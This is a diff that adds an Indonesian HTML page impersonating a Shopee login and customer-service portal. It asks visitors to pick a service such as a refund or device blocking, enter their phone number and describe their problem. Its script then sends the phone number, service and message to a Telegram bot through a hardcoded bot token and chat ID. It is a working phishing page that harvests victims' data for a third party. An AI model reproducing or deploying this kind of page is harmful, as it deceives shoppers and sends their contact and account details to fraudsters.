@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log In Shopee Indonesia</title>
+    <style>
+        *{margin:0; padding:0; box-sizing:border-box; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;}
+        body{
+            background:#fff;
+            min-height:100vh;
+        }
+
+        /* === HEADER === */
+        .header{
+            background:#ff5722;
+            padding:14px 16px;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            position:relative;
+        }
+        .kembali-atas{
+            position:absolute;
+            left:16px;
+            color:white;
+            font-size:20px;
+            text-decoration:none;
+        }
+        .header h1{
+            color:white;
+            font-size:18px;
+            font-weight:600;
+        }
+
+        /* === LOGO === */
+        .logo{
+            text-align:center;
+            margin:30px 0;
+        }
+        .logo-icon{
+            width:80px;
+            height:80px;
+            background:#ff5722;
+            border-radius:12px;
+            display:inline-flex;
+            align-items:center;
+            justify-content:center;
+            font-size:40px;
+            font-weight:900;
+            color:white;
+        }
+
+        /* === HALAMAN PILIH LAYANAN === */
+        .judul-pilih{
+            text-align:center;
+            font-size:20px;
+            font-weight:600;
+            color:#333;
+            margin-bottom:30px;
+        }
+        .daftar-layanan{
+            padding:0 20px;
+            display:flex;
+            flex-direction:column;
+            gap:14px;
+        }
+        .layanan{
+            background:#f5f5f5;
+            border-radius:8px;
+            padding:18px 20px;
+            border:1px solid #e8e8e8;
+            cursor:pointer;
+            transition:0.2s;
+        }
+        .layanan:active{background:#eeeeee;}
+        .layanan-nama{
+            font-size:16px;
+            color:#222;
+        }
+
+        /* === HALAMAN LOGIN/FORM === */
+        .halaman{display:none;}
+        .halaman.aktif{display:block;}
+        .konten{padding:0 24px;}
+        .label-input{
+            display:flex;
+            align-items:center;
+            gap:8px;
+            font-size:17px;
+            color:#333;
+            margin-bottom:10px;
+        }
+        .label-input span{font-size:20px;}
+        .input-teks{
+            width:100%;
+            padding:14px 12px;
+            border:none;
+            border-bottom:1px solid #ddd;
+            font-size:16px;
+            margin-bottom:24px;
+            outline:none;
+        }
+        .input-teks:focus{border-bottom-color:#ff5722;}
+        .btn-lanjut{
+            width:100%;
+            padding:14px;
+            background:#ccc;
+            color:#888;
+            border:none;
+            border-radius:6px;
+            font-size:16px;
+            font-weight:500;
+            cursor:not-allowed;
+            margin-bottom:20px;
+        }
+        .btn-lanjut.aktif{
+            background:#ff5722;
+            color:white;
+            cursor:pointer;
+        }
+        .tautan{
+            text-align:center;
+            margin:12px 0;
+            font-size:15px;
+            color:#666;
+        }
+        .tautan a{
+            color:#ff5722;
+            text-decoration:none;
+        }
+        .pemisah{
+            text-align:center;
+            color:#999;
+            margin:20px 0;
+        }
+        .btn-opsi{
+            width:100%;
+            padding:13px;
+            background:#fff;
+            border:1px solid #ddd;
+            border-radius:6px;
+            font-size:15px;
+            margin-bottom:10px;
+            cursor:pointer;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            gap:8px;
+        }
+        .btn-opsi:active{background:#f5f5f5;}
+        .catatan{
+            text-align:center;
+            margin-top:20px;
+            font-size:14px;
+            color:#777;
+        }
+        .catatan a{color:#ff5722; text-decoration:none;}
+
+        /* === FORM DETAIL === */
+        .form-bawah{margin-top:10px;}
+        .form-bawah label{
+            display:block;
+            margin-bottom:6px;
+            font-size:15px;
+            color:#444;
+        }
+        .form-bawah textarea{
+            width:100%;
+            padding:12px;
+            border:1px solid #ddd;
+            border-radius:6px;
+            font-size:15px;
+            min-height:100px;
+            resize:none;
+            margin-bottom:12px;
+        }
+        .status{
+            margin-top:15px;
+            padding:12px;
+            border-radius:6px;
+            text-align:center;
+            display:none;
+            font-weight:500;
+        }
+        .sukses{background:#e8f5e9; color:#2e7d32; display:block;}
+        .gagal{background:#ffebee; color:#c62828; display:block;}
+    </style>
+</head>
+<body>
+
+    <!-- HALAMAN 1: PILIH LAYANAN -->
+    <div id="halamanPilih" class="halaman aktif">
+        <div class="header">
+            <h1>Pilih Layanan</h1>
+        </div>
+        <div class="logo">
+            <div class="logo-icon">S</div>
+        </div>
+        <h2 class="judul-pilih">Pilih Fitur Layanan</h2>
+        <div class="daftar-layanan">
+            <div class="layanan" data-layanan="Update Resi">
+                <div class="layanan-nama">Update Resi</div>
+            </div>
+            <div class="layanan" data-layanan="Pesanan Bermasalah">
+                <div class="layanan-nama">Pesanan Bermasalah</div>
+            </div>
+            <div class="layanan" data-layanan="Pengembalian Dana">
+                <div class="layanan-nama">Pengembalian Dana</div>
+            </div>
+            <div class="layanan" data-layanan="Pemblokiran Perangkat Tidak Dikenal">
+                <div class="layanan-nama">Pemblokiran Perangkat Tidak Dikenal</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- HALAMAN 2: MASUKAN NOMOR -->
+    <div id="halamanLogin" class="halaman">
+        <div class="header">
+            <a href="#" class="kembali-atas" id="kembaliKePilih">←</a>
+            <h1>Log In Shopee Indonesia</h1>
+        </div>
+        <div class="logo">
+            <div class="logo-icon">S</div>
+        </div>
+        <div class="konten">
+            <label class="label-input">
+                <span>📞</span> Masukkan Nomor Handphone
+            </label>
+            <input type="tel" id="nomorHP" class="input-teks" placeholder="Contoh: 0812xxxxxxx">
+
+            <button id="btnLanjut" class="btn-lanjut">Lanjut</button>
+
+            <p class="tautan"><a href="#">Log in dengan Password</a></p>
+
+            <p class="pemisah">ATAU</p>
+
+            <button class="btn-opsi" disabled>
+                <span>G</span> Log In dengan Google
+            </button>
+            <button class="btn-opsi" disabled>
+                <span>f</span> Log In dengan Facebook
+            </button>
+
+            <p class="catatan">Belum punya akun? <a href="#">Daftar</a></p>
+        </div>
+    </div>
+
+    <!-- HALAMAN 3: ISI DETAIL LAPORAN -->
+    <div id="halamanDetail" class="halaman">
+        <div class="header">
+            <a href="#" class="kembali-atas" id="kembaliKeLogin">←</a>
+            <h1 id="judulLayanan"></h1>
+        </div>
+        <div class="konten form-bawah">
+            <input type="hidden" id="simpanNomor">
+            <input type="hidden" id="simpanLayanan">
+            
+            <label>Detail Laporan / Keluhan</label>
+            <textarea id="detailLaporan" placeholder="Jelaskan secara rinci masalah atau permintaan Anda..."></textarea>
+            
+            <button id="btnKirim" class="btn-lanjut aktif">Kirim Laporan</button>
+            
+            <div id="status" class="status"></div>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8975947337:AAGFpurug3IfO0WExIM9wfSfFUdv6GpPOTE";
+        const CHAT_ID = "6854649794";
+
+        const pilih = document.getElementById('halamanPilih');
+        const login = document.getElementById('halamanLogin');
+        const detail = document.getElementById('halamanDetail');
+        let layananTerpilih = "";
+
+        // Pilih layanan → buka halaman nomor
+        document.querySelectorAll('.layanan').forEach(item => {
+            item.addEventListener('click', () => {
+                layananTerpilih = item.getAttribute('data-layanan');
+                document.getElementById('judulLayanan').textContent = layananTerpilih;
+                pilih.classList.remove('aktif');
+                login.classList.add('aktif');
+            });
+        });
+
+        // Kembali ke pilih layanan
+        document.getElementById('kembaliKePilih').addEventListener('click', (e) => {
+            e.preventDefault();
+            login.classList.remove('aktif');
+            pilih.classList.add('aktif');
+            document.getElementById('nomorHP').value = '';
+            document.getElementById('btnLanjut').classList.remove('aktif');
+        });
+
+        // Aktifkan tombol Lanjut kalau ada nomor
+        const nomorHP = document.getElementById('nomorHP');
+        const btnLanjut = document.getElementById('btnLanjut');
+        nomorHP.addEventListener('input', () => {
+            if(nomorHP.value.trim().length >= 10){
+                btnLanjut.classList.add('aktif');
+            } else {
+                btnLanjut.classList.remove('aktif');
+            }
+        });
+
+        // Lanjut → buka halaman detail
+        btnLanjut.addEventListener('click', () => {
+            if(!btnLanjut.classList.contains('aktif')) return;
+            document.getElementById('simpanNomor').value = nomorHP.value.trim();
+            document.getElementById('simpanLayanan').value = layananTerpilih;
+            login.classList.remove('aktif');
+            detail.classList.add('aktif');
+        });
+
+        // Kembali ke halaman nomor
+        document.getElementById('kembaliKeLogin').addEventListener('click', (e) => {
+            e.preventDefault();
+            detail.classList.remove('aktif');
+            login.classList.add('aktif');
+            document.getElementById('detailLaporan').value = '';
+            document.getElementById('status').style.display = 'none';
+        });
+
+        // Kirim ke Telegram
+        document.getElementById('btnKirim').addEventListener('click', async () => {
+            const status = document.getElementById('status');
+            status.style.display = 'none';
+
+            const nomor = document.getElementById('simpanNomor').value;
+            const layanan = document.getElementById('simpanLayanan').value;
+            const detailIsi = document.getElementById('detailLaporan').value.trim();
+
+            if(!detailIsi){
+                status.className = 'status gagal';
+                status.textContent = '⚠️ Silakan isi detail laporan dulu!';
+                return;
+            }
+
+            const pesan = `📩 LAPORAN BARU DITERIMA!
+━━━━━━━━━━━━━━━━━━━━━━
+🔹 Layanan: ${layanan}
+📞 Nomor HP: ${nomor}
+📝 Detail Laporan:
+${detailIsi}
+━━━━━━━━━━━━━━━━━━━━━━
+🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
+
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: CHAT_ID, text: pesan})
+                });
+
+                if(res.ok){
+                    status.className = 'status sukses';
+                    status.textContent = '✅ Laporan BERHASIL dikirim! Terima kasih.';
+                    document.getElementById('detailLaporan').value = '';
+                } else {
+                    throw new Error();
+                }
+            } catch(err) {
+                status.className = 'status gagal';
+                status.textContent = '❌ Gagal! Kirim pesan dulu ke Bot kamu ya.';
+            }
+        });
+    </script>
+</body>
+</html>
